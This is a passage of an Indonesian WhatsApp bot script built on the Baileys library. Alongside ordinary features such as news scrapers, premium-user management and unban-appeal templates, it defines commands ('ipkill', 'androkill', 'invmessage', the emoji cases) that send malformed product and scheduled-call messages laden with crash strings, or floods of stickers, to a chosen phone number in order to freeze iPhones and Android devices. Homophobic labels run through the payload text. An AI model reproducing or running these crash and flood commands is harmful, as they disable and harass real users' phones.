attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
}
reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
case 'ipkill':
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
attention = async (teks) => {
let schedule = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: m.chat, quoted: kalgans })
vinz.relayMessage(m.chat, schedule.message, { messageId: schedule.key.id })
	}
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(10)
var messa = await prepareWAMessageMedia({ image: kontol }, { upload: vinz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `𝚅𝚒𝚗𝚣 𝚇𝟽${ios1}${ios2}`,
"description": `𝙺𝙸𝙻𝙻 𝙸𝙿𝙷𝙾𝙽𝙴 𝚅𝙸𝚁𝚄𝚂 𝚅𝟷☔\n${ios1}${ios2}`,
"jpegThumbnail": thumb,
"footerText": `𝚅𝚒𝚗𝚣 𝚇𝟽${ios1}${ios2}`,
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝚅𝚒𝚗𝚣 𝚇𝟽${ios1}${ios2}`,
"url": "wa.me/0"
},
"businessOwnerJid": "0@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: vinzsticker })
vinz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
break
case 'androkill':
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
attention = async (teks) => {
let schedule = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: m.chat, quoted: kalgans })
vinz.relayMessage(m.chat, schedule.message, { messageId: schedule.key.id })
	}
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(10)
var messa = await prepareWAMessageMedia({ image: xxtmage }, { upload: vinz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `𝚅𝚒𝚗𝚣 𝚇𝟽${bugui}`,
"description": `𝙺𝙸𝙻𝙻 𝙰𝙽𝙳𝚁𝙾𝙸𝙳 𝚅𝙸𝚁𝚄𝚂 𝚅𝟷☔${bugui}`,
"jpegThumbnail": thumb,
"footerText": `𝚅𝚒𝚗𝚣 𝚇𝟽${bugui}`,
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝚅𝚒𝚗𝚣 𝚇𝟽${bugui}`,
"url": "wa.me/0"
},
"businessOwnerJid": "0@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: vinzsticker })
vinz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
break
case 'bugpayment':
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
var messa = await prepareWAMessageMedia({ image: xxtmage }, { upload: vinz.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendeqtextMessage": {
"text": `𓁿 •RXHL OFFICIAL• 𓁿`,
}
}}), { userJid: m.chat, quoted: m})
vinz.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
break
case '❤️': case '🎮': case '🤤': case '🥹': case '😋': case '😛': 
if (!isCreator) return
if (!dtext) return reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
vinz.sendMessage(Pe, { sticker : xxtmage }, { quoted:vinzbugnew })
await sleep(2000)
reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case 'invmessage': {
if (!isCreator) return reply(mess.owner)
reply(mess.wait)
sendto = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = "10"
var messa = await prepareWAMessageMedia({ image: xxtmagev1 }, { upload: vinz.waUploadToServer })
for (let i = 0; i < jumlah; i++) {
await sleep(1000)
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `🇵🇸༘༡Vinz X7 𑅆༏${mdelay}`,
"description": `𝐒𝐚𝐯𝐞 𝐏𝐚𝐥𝐞𝐬𝐭𝐢𝐧𝐞🇵🇸${mdelay}`,
"currencyCode": "IDR",
"footerText": `𝐒𝐚𝐯𝐞 𝐏𝐚𝐥𝐞𝐬𝐭𝐢𝐧𝐞🇵🇸`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝐒𝐚𝐯𝐞 𝐏𝐚𝐥𝐞𝐬𝐭𝐢𝐧𝐞🇵🇸${mdelay}`,
"url": `𝐒𝐚𝐯𝐞 𝐏𝐚𝐥𝐞𝐬𝐭𝐢𝐧𝐞🇵🇸`
},
"businessOwnerJid": "@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: kalgans })
vinz.relayMessage(sendto, catalog.message, { messageId: catalog.key.id })
await sleep(3000)
}
reply(mess.wait)
}
break
//▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\\
//▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\\
//▮                         ▮
//▮▮                    ▮
//▮     ▮               ▮
//▮          ▮          ▮
//▮               ▮     ▮
//▮                    ▮▮
//▮                         ▮
//
//▮                         ▮
//     ▮               ▮
//          ▮     ▮
//               ▮
//               ▮
//              ▮
//               ▮
//
//     ▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮▮
//▮               ▮
//▮               ▮
//▮               ▮
//
//▮▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮
//▮     ▮
//▮          ▮
//▮               ▮
//
//▮▮▮▮▮
//          ▮
//          ▮
//         ▮
//          ▮
//         ▮
//▮▮▮▮▮
//
//
//
//     ▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮▮
//▮               ▮
//▮               ▮
//▮               ▮
//
//▮▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮
//▮
//▮
//▮
//
//     ▮▮▮
//▮               ▮
//▮               ▮
//▮▮▮▮▮
//▮               ▮
//▮               ▮
//▮               ▮
//▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\\
case 'p': case 'woy': case 'pp': case 'ppp': case 'pppp': case 'ppppp': case 'pe': case 'pee': 
await vinz.sendMessage(m.chat, {react: {text: `🥵`, key: m.key}})
await sleep(0)
replyv1('Minimal Salam🥵')
break
//▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\\
case 'textunban1':
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (!dtext) return replywalu('Contoh textunban1 62846383839')
anu = `Hallo WhatsApp Meine WhatsApp-Nummer wurde ohne Grund gesperrt. Bitte reaktivieren Sie meine WhatsApp-Nummer, da diese Nummer viele meiner persönlichen Daten enthält, die ich unter dieser Nummer speichere, und ich diese Nummer auch für meine Büroarbeiten verwende, was sehr wichtig ist. Bitte reaktivieren Sie meine WhatsApp-Nummer so schnell wie möglich. Danke. mon numéro whatsapp : +${dtext}`
reply(anu)
break
case 'textunban2':
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (!dtext) return replywalu('Contoh textunban2 62846383839')
anu = `bonjour WhatsApp. Pourquoi mon numéro est-il subitement bloqué ? Veuillez réactiver mon numéro dès que possible car le numéro est utilisé pour mon entreprise et je n'ai jamais enfreint les politiques de Whatsapp.
Mon numéro : +${dtext}`
reply(anu)
break
case 'textunban3':
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (!dtext) return replywalu('Contoh textunban3 62846383839')
anu = `Halo selamat pagi whatsapp saya adalah salah satu pengguna whatsapp dengan nomor berikut +${dtext} saya mengalami masalah tentang nomor whatsapp saya yang diblokir. Saat saya membuka aplikasi whatsapp saya mendapatkan notifikasi yang berisikan bahwa "Akun ini tidak dapat menggunakan aplikasi WhatsApp" sebelumnya saya hanya melalukan pengiriman pesan chat kepada keluarga saya saat saya sedang bekerja. dan saya tidak merasa melakukan pelanggaran apapun yang bertentangan dengan ketentuan layanan whatsapp. Dengan permohonan maaf saya menjadi salah satu pertimbangan untuk mengaktifkan kembali akun whatsapp yang diblokir. Terimakasih`
reply(anu)
break
case 'textunban4':
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (!dtext) return replywalu('Contoh textunban4 62846383839')
anu = `hello whatsapp My WhatsApp number has been blocked but I have never violated WhatsApp policy, please reactivate my number as soon as possible because I use this number for my business and it contains a lot of my personal data Please help whatsapp.My number : +${dtext}`
reply(anu)
break
case 'unbantinjau':
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
anu = `ہیلو واٹس ایپ میرا واٹس ایپ نمبر بلا وجہ بلاک کر دیا گیا۔ براہ کرم میرا واٹس ایپ نمبر دوبارہ فعال کریں کیونکہ اس نمبر میں میرا بہت سا ذاتی ڈیٹا ہے جو میں اس نمبر کے نیچے محفوظ کرتا ہوں اور میں اس نمبر کو اپنے دفتری کاموں کے لیے بھی استعمال کرتا ہوں جو بہت اہم ہے۔ برائے مہربانی میرا واٹس ایپ نمبر جلد از جلد دوبارہ فعال کریں۔ شکریہ.`
reply(anu)
break
//▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\\
case 'owner': case 'botowner':
let ownContact = {
	displayName: "Contact", contacts: [{displayName: ownName, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownName+";;;\nFN:"+ownName+"\nitem1.TEL;waid="+ownNumber+":"+ownNumber+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
}
let soContact = await vinz.sendMessage(m.chat, {contacts: ownContact}, {quoted: m})
await sleep(5)
vinz.sendText(m.chat, `𝐌𝐲 𝐎𝐰𝐧𝐞𝐫✌️`, soContact)
await sleep(10)
replyv1(`𝚁𝚞𝚕𝚎𝚜:
- 𝚃𝚒𝚍𝚊𝚔 𝙲𝚑𝚊𝚝 𝙾𝚠𝚗𝚎𝚛 𝙺𝚊𝚕𝚊𝚞 𝙶𝚊 𝙿𝚎𝚗𝚝𝚒𝚗𝚐
- 𝚃𝚒𝚍𝚊𝚔 𝚂𝚙𝚊𝚖 𝙾𝚠𝚗𝚎𝚛 𝙺𝚎𝚝𝚒𝚔𝚊 𝙻𝚊𝚐𝚒 𝙾𝚏𝚏
- 𝚃𝚒𝚍𝚊𝚔 𝚂𝚙𝚊𝚖 𝚃𝚎𝚕𝚎𝚙𝚘𝚗
- 𝚃𝚒𝚍𝚊𝚔 𝚁𝚊𝚜𝚒𝚜
- 𝙷𝚊𝚛𝚞𝚜 𝚂𝚘𝚙𝚊𝚗
- 𝙺𝚊𝚕𝚊𝚞 𝙼𝚊𝚞 𝙱𝚞𝚢 𝚂𝚊𝚋𝚊𝚛 𝙰𝚓𝚊 𝙿𝚊𝚕𝚒𝚗𝚐𝚊𝚗 𝙾𝚠𝚗𝚎𝚛 𝙻𝚊𝚐𝚒 𝙾𝚏𝚏 𝙺𝚊𝚕𝚊𝚞 𝙶𝚊 𝙱𝚊𝚕𝚎𝚜 𝙲𝚑𝚊𝚝 𝙻𝚞.

𝚃𝚎𝚛𝚒𝚖𝚊𝚔𝚊𝚜𝚒𝚑 𝙷𝚊𝚛𝚊𝚙 𝙳𝚒 𝙼𝚎𝚗𝚐𝚎𝚛𝚝𝚒😁`)
break
case "welcome":
{
if (!isAuthor) return replyv1(mess.Author)
if (!m.isGroup) return reply(mess.group)
await loading()
if (args.length < 1) return reply('𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙺𝙴𝚃𝙸𝙺 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝙾𝙽 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙽𝚈𝙰𝙻𝙰𝙺𝙰𝙽 𝙵𝙸𝚃𝚄𝚁 𝚆𝙴𝙻𝙲𝙾𝙼𝙴\n𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙺𝙴𝚃𝙸𝙺 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝙾𝙵𝙵 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙽𝚈𝙰𝙻𝙰𝙺𝙰𝙽 𝙵𝙸𝚃𝚄𝚁 𝚆𝙴𝙻𝙲𝙾𝙼𝙴')
if (args[0] === "on") {
if (welcm) return reply('Sudah Aktif')
wlcm.push(m.chat)
var groupe = await vinz.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
vinz.sendMessage(m.chat, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return reply('Sudah Non Aktif')
let off = wlcm.indexOf(m.chat)
wlcm.splice(off, 1)
reply('Sukses Mematikan Welcome  di group ini')
}
}
break
case 'antilink': {
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
if (!m.isGroup) return replywalu(mess.group)
if (!isBotGroupAdmins) return replywalu(mess.botAdmin)
if (!isGroupAdmins) return replywalu('Lah Dikira Admin Group Kali')
await loading()
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return reply('Sudah Aktif')
ntilink.push(m.chat)
reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return reply('Sudah Mati')
let off = ntilink.indexOf(m.chat)
ntilink.splice(off, 1)
reply('Succes mematikan antilink di group ini 🌷')
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'credits': {
attention = async (teks) => {
let schedule = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: m.chat, quoted: fdoc })
vinz.relayMessage(m.chat, schedule.message, { messageId: schedule.key.id })
	}
attention(`${credits}`)
}
break
case 'rules': case 'peraturan': {
attention = async (teks) => {
let schedule = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: m.chat, quoted: fdoc })
vinz.relayMessage(m.chat, schedule.message, { messageId: schedule.key.id })
	}
attention(`${rules}`)
}
break
case 'sc': case 'script': {
attention = async (teks) => {
let schedule = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: m.chat, quoted: fdoc })
vinz.relayMessage(m.chat, schedule.message, { messageId: schedule.key.id })
	}
attention(`𝐏𝐑𝐈𝐕𝐀𝐓𝐄`)
}
break
case 'rulesbot': case 'peraturanbot': {
attention = async (teks) => {
let schedule = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: m.chat, quoted: fdoc })
vinz.relayMessage(m.chat, schedule.message, { messageId: schedule.key.id })
	}
attention(`${rulesbot}`)
}
break
case 'addprem':
if (!isAuthor) return replyv1(mess.Author)
if (!args[0]) return replywalu(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628888889699`)
bnnd = dtext.replace(/[^0-9]/g,'')
let ceknye = await vinz.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return replywalu(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./premium.json', JSON.stringify(owner))
replywalu(`Sukses 😝`)
vinz.sendMessage(bnnd+'@s.whatsapp.net', { image: xxtmagev1, caption: `Kamu Sekarang Adalah User Premium!!`},{quoted: floc})
break
case 'delprem':
if (!isAuthor) return replyv1(mess.Author)
if (!args[0]) return replywalu(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62889888970`)
yaki = dtext.replace(/[^0-9]/g,'')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./premium.json', JSON.stringify(owner))
replywalu(`Sukses😝`)
break
case 'listprem':
 teksooo = '*List Premium*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
vinz.sendMessage(m.chat, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break
case 'autodelete': {
if (!isCreator) return
if (args.length < 1) return replywalu('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (autodelete) return replywalu('Sudah On')
antidel.push(m.chat)
} else if (args[0] === "off") {
if (!autodelete) return replywalu('Sudah Mati')
let off = antidel.indexOf(m.chat)
antidel.splice(off, 1)
} else {
replywalu('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'cnn':
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
replywalu(teks) 
})
break
//=================================================//
case 'layarkaca':
if (!dtext) return replywalu('Judul') 
LayarKaca21(dtext).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
replywalu(teks) 
})
break
//=================================================//
case 'cnbc':
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'tribun':
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'indozone':
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'kompas':
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'detik':
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
vinz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'daily':
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
